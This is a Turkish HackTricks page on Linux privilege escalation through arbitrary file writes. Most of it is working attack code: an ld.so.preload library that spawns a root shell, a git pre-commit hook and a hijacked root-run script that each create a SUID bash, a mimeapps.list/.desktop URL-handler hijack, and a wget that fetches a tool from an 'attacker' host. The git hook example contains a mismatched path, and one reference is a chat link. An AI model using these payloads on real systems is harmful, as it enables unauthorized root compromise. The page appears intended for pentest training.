# Root'a Keyfi Dosya Yazma

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Bu dosya **`LD_PRELOAD`** ortam değişkeni gibi davranır ancak **SUID binaries** üzerinde de çalışır.\
Eğer bu dosyayı oluşturabilir veya değiştirebilirseniz, çalıştırılan her binary ile yüklenecek bir kütüphanenin **yolunu** ekleyebilirsiniz.

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) bir git deposunda bir commit oluşturulduğunda, merge yapıldığında gibi çeşitli **olaylarda** **çalıştırılan** **scriptlerdir**. Eğer bir **ayrıcalıklı script veya kullanıcı** bu eylemleri sıkça gerçekleştiriyorsa ve **`.git` klasörüne yazmak`** mümkünse, bu **privesc** için kullanılabilir.

Örneğin, bir git deposunda **`.git/hooks`** dizinine bir **script oluşturmak** mümkün, böylece yeni bir commit oluşturulduğunda her zaman çalıştırılır:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

Bir saldırganın kurbanın yapılandırma dizinlerine yazma izni varsa, sistem davranışını değiştiren dosyaları kolayca değiştirebilir veya oluşturabilir; bu da istem dışı kod çalıştırmaya yol açar. `$HOME/.config/mimeapps.list` dosyasını HTTP ve HTTPS URL işleyicilerini kötü amaçlı bir dosyaya gösterecek şekilde değiştirmek suretiyle (ör. `x-scheme-handler/http=evil.desktop` olarak ayarlamak), saldırgan **herhangi bir http veya https bağlantısına tıklandığında o `evil.desktop` dosyasında belirtilen kodun tetiklenmesini** sağlar. Örneğin, aşağıdaki kötü amaçlı kodu `$HOME/.local/share/applications` içindeki `evil.desktop` dosyasına yerleştirdikten sonra, herhangi bir harici URL tıklaması gömülü komutu çalıştırır:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Daha fazla bilgi için [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) adresine bakın; burada gerçek bir zafiyeti istismar etmek için kullanıldı.

### Root'un kullanıcı tarafından yazılabilir script/binary'lerini çalıştırması

Eğer yetkili bir workflow `/bin/sh /home/username/.../script` (veya ayrıcalıksız bir kullanıcının sahip olduğu bir dizinin içindeki herhangi bir binary) gibi bir şey çalıştırıyorsa, bunu ele geçirebilirsiniz:

- **Çalıştırmayı tespit et:** süreçleri [pspy](https://github.com/DominicBreuker/pspy) ile izleyerek root'un kullanıcı kontrollü yolları çağırmasını yakalayın:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** hedef dosyanın ve dizininin kullanıcınız tarafından sahiplenilmiş ve yazılabilir olduğundan emin olun.
- **Hijack the target:** orijinal binary/script'in yedeğini alın ve SUID shell (veya başka herhangi bir root eylemi) oluşturan bir payload bırakın, sonra izinleri geri yükleyin:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Ayrıcalıklı işlemi tetikleyin** (ör. helper'ı spawn eden bir UI düğmesine basmak). root tekrar hijacked path'i çalıştırdığında, yükseltilmiş shell'i `./rootshell -p` ile yakalayın.

## Referanslar

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
